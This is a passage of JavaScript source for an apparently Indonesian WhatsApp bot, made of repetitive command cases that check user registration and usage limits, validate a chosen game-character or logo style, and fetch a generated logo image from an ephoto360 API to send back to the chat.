	const style = ['aphelios','karma','leesin-2','nidalee-2','soraka-2','soraka-3','swain','akali-4','ekko-2','qiyana','senna','yasuo-3','ahri-2','akali-3','ashe-3','caitlyn','camille','darius','draven','evelynn-2','kaisa','kayle','pantheon','rengar','sivir-2','sona','vayne-3','wukong','zoe-2','zyra','azir','garen','jinx-3','katarina-3','lux-3','nasus','nidalee','sejuani','sylas','vayner-2','vi-2','warwick-2','fiora-2','irelia-3','janna-2','jax','leesin','nasteryi-2','norgana','nami','riven-2','riven-3','talon-2','neeko','neeko-2','xayahrakan','zoe','ahri','ezreal-2','janna','jinx-2','lulu','lux-2','nissfortune','poopy','soraka','syndra','ezreal','graves','jayce','katarina-2','lux','yuumi','aatrox','akali-2','diana','elise','evelynn','jhin-2','kalista-2','kennen','pyke-2','shen','sivir','talon','twistedfate','thresh-2','yasuo-2','zilean','ashe-2','kalista','khazix','riven','riven','shyvana','thresh','zed-2','akali','ashe','ekko','fiora','irelia','irelia-2','jhin','jinx','katarina','leona','lucian','nasteryi','pyke','vayne','vi','warwick','yasuo','zed']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'effect3donbeach':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('background', 'beach-1', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('background', 'beach-1', prefix, command))
const style = ['beach-1','beach-2','beach-3','beach-4','beach-5','beach-6']
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, background : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'cutegirlgamer':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'style-1', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'style-1', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['style-1','style-2','style-3','style-4','style-5','style-6', 'style-7','style-8','style-9', 'style-10','style-11','style-12']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'footballteam':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'nau-6', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'nau-6', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['nau-1','nau-2','nau-3','nau-4','nau-5','nau-6']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'beautifulshimmering':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('champion', 'kahlii', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('champion', 'kahlii', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['aleister','alice','butterfly','diaochan','kahlii','krixi','nina','nakroth','natalya','taara','thane','violet','zanis','zata','airi','annette','arthur','arum','astrid','elandorr','gildur','gildur','hayate','ilumia','ishar','lauriel','lindis','nurad','quillen','rouie','sephera','yena','yorn']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Champion')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, champion : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'pubgcutelogo':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'soldier', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'soldier', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['chicken','soldier']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'elegantrotation':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'dragon', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'dragon', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['bull','dragon','eagle','lion','rhino','tiger']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'logogamingassasin':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'style-2', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'style-2', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['style-1','style-2','style-3','style-4','style-5','style-6','style-7','style-8','style-9','style-10','style-11','style-12','style-13','style-14','style-15','style-16','style-17','style-18','style-19','style-20','style-21','style-22','style-23','style-24']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'introvideomaker':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'tiger', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'tiger', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['bull','dragon','eagle','lion','tiger','skull']
 if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'gaminglogo4fvs':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'soldier', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'soldier', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['girl','ghost','soldier-2','swat','woman','soldier','sniper','raccoon','rabbit','panda','chicken']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'blueneon':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'dugong', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'dugong', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['tiger','shark','dugong','bull','cheetah','lion']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'metalmascot':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'dragon', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'dragon', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['snakelion','dragon','ragon-2','eagle','falcon','fox','lion','panther','phoenix','phoenix','rhino','squirrel','tiger','unicorn','wolf','zebra']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'anonymous2':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('style', 'style1', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'style1', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['style1','style2','style3']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
	let textpro2 = (api('alfa', '/api/ephoto360/anonymous'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'lolpentakill':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('style', 'kassadin', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'kassadin', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['jhin','syndra','olaf','nocturne','chogath','kassadin','nidalee','fiora','fiddlesticks','garen','irelia-2','janna','lissandra','ezreal','riven','nalphite','khazix','nasteryi','irelia','alista','jayce','singed','galio','velkoz','yi','yasuo','sona','nidalee-2','teemo','leesin','jinx','zed','camille','brand','warwick','rengar','vayne','leona','ashe','ezreal','annie','xerath','ahri','kayle','nissfortune','caitlyn','vi','leesin','darius','fizz','bloodyasuo','ekko','lucian','rakanandayah']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'avatarleagueofking':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('style', 'ishar-4', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'ishar-4', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['arum-6','baldum-3','elandorr-3','hayate-5','ilumia-5','ishar-4','lauriel-8','nax-5','nurad-9','quillen-6','teemee-3','telannas-8','volkath-3','yena-4','yena-5','butterfly-10','laville','yuumi','laville-2','nakroth-7','omen-6','rouie-2','taara-4','zanis-8','zata','zata-2','yasuo','elsu-6','fennik-5','liliana-7','paine','paine-2','rouie','astrid-4','ata','ata-2','lauriel-8','omen-5','qi-3','roxie-5','taara-5','violet-12','wukong-7','wukong-8','hayate-4','ishar-3','jinna-5','keera-2','lauriel-7','quillen-5','richter-4','ryoma-6','telannas-8','tulen-9','yorn-8','aleister-4','dirak-2','grakk-5','kerra','raz-5','amily-5','athur-7','arum-5','ishar-2','nax-4','natalya-6','natalya-7','zill-5','diaochan-6','ignis-4','lubu-8','naloch-7','sephera-4','elandorr','elandorr-2','krizziz-2','violet-11','yena-3','arduin-4','enzo-3','errol-3','hayate-3','krixi-7','krizziz','nurad-8','volkath','volkath-2','wisp-4','wukong-6','celica','gildur-4','ishar','nurad-7','quillen-4','tulen-8','lauriel-6','qi','qi-2','darcy-3','florentino-3','noren-3','ryoma-5','sephera-3','annette-4','capheny-3','elsu-5','narja','veres-3','violet-10','zip','zip-2','diaochan-5','enzo-2','lubu-7','nganga-4','payna-3','roxie-4','violet-9','zanis-7','zephys-6','enzo','liliana-6','lindis-5','xeniel-5','airi-9','errol-2','yena-2','zuka-8','notos','chaugnar','kahlii','lubo','nina','krixi','zanis-3','jinna','fennik','airi','ormarr','toro','butterfly','nakroth','gildur','omega','natalya','lumburr','yorn','dieu-thuyen','nganga','grankk-2','azzenka','alice','violet','violet2','butterfly2','krixi2','natalya2','taara','ormarr2','valhein','zephys','nakroth2','aleister','payna','wukong','naloch','kricnak','slimz2','cresht','slimz','dieu-thuyen2','thane-2','preyta','fennik-2','raz','preyta-2','payna-2','illumia','nortos-2','yorn-2','violet-3','valhein-2','taara-2','skud-1','skud','natalya-3','lu-bu','jinna-2','illumia-2','butterfly-4','batman','zuka-2','airi-2','zanis','nurad','nurad-2','nina-2','lauriel-2','ignis-2','ignis','grakk','airi-3','zill-2','zill','zanis-2','yorn-3','veera-3','veera-2','telannas','superman','naloch-2','krixi-3','butterfly-5','violet-5','veera-4','telannas-2','illumia-3','batman-2','arduin-2','arduin','wukong-2','nakroth-3','arthur','ryoma-2','ryoma','raz-2','nganga-2','astrid-2','astrid','zanis-4','xeniel','wukong-3','noren','lauriel-3','joker','xeniel-2','telannas-3','nurad-3','lubu-4','lubu-3','kriknak-2','kahlii-2','diaochanlubu','chaugnar-2','azzenka-2','alice-2','aleister-2','noren-2','lubu-5','lauriel-4','kilgoth','gildur-2','fennik-3','zephys-3','wonderwoman','superman-2','slimz-3','natalya-4','krixi-5','krixi-4','zephys-2','zanis-5','yorn-4','xeniel-3','wonderwoman-2','violet-4','naloch-3','airi-4','telannas-4','ormarr-4','ormarr-3','nakroth-4','kilgroth-2','kahlii-3','grakk-3','natalya-5','fennik-4','valhein-3','teemee-2','teemee','lindis','zuka-3','tulen','toro-2','nina-3','naloch-4','lumburr-2','lindis-2','joker-2','grakk-4','gildur-3','aleister-3','tulen-2','toro-3','taara-3','omen-2','omen','zill-3','arthurtelannas','zuka-4','nakroth-5','nax','liliana','raz-3','liliana-2','nax-2','krixnak-3','joker-3','chaugnar-3','wisp','ryoma-3','batman-3','airi-6','tulen-3','cresht-3','cresht-2','astris-3','flash','arum-2','arum','butterfly-6','alice-3','xeniel-4','valhein-4','tulen-4','rourke-2','rourke','nurad-4','nax-3','wisp-2','narja-2','narja','zuka-5','jinna-3','butterfly-7','arthur-5','valhein-5','superman-3','liliana-3','kilgroth','wirosabaleng','roxie-2','roxie','wukong-4','baldum-2','baldum','zephys-4','annette-2','annette','telannas-6','raz-4','nurad-6','nurad-5','jinna-4','amily','ybneth-2','ybneth','ilumia-4','amily-2','xeniel-5','veera-5','liliana-4','flash-2','arthur-2','omen-3','lindis-3','elsu-2','elsu','richter-2','richter','nina-4','thane-3','ryoma-4','quillen-2','quillen','lauriel-5','arum-3','wisp-3','violet-7','sephera-2','sephera','naloch-5','krixi-6','alice-4','tulen-5','skud-3','rourke-3','nakroth-6','florentino-2','florentino','elsu-3','butterfly-8','amily-3','zuka-7','zuka-6','yorn-7','yorn-6','veres-2','veres','naloch-6','cresht-4','azzenka-3','airi-7','zephys-5','yorn-5','violet-8','valhein-6','thane-4','roxie-3','nakroth-7','kahlii-4','elsu-4','darcy-2','darcy','capheny','zill-4','hayate-2','hayate','cresht-5','annette-3','amily-4','tulen-7','telannas-7','omen-4','lindis-4','liliana-5','ignis-3','errol','capheny-2','arum-4','zanis-6','wukong-5','thane-5','slimz-4','skud-4','richter-3','quillen-3','azzenka-4','arduin-3','airi-8']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'avatarff':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'antonio', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'antonio', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['a124','alok','alvaro','andrew','antonio','caroline','ford','hayato','joseph','kelly','kla','laura','naxim','niguel','nisa','noco','nikita','notora','olivia','paloma','rafael','shani','steffie','wukong']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
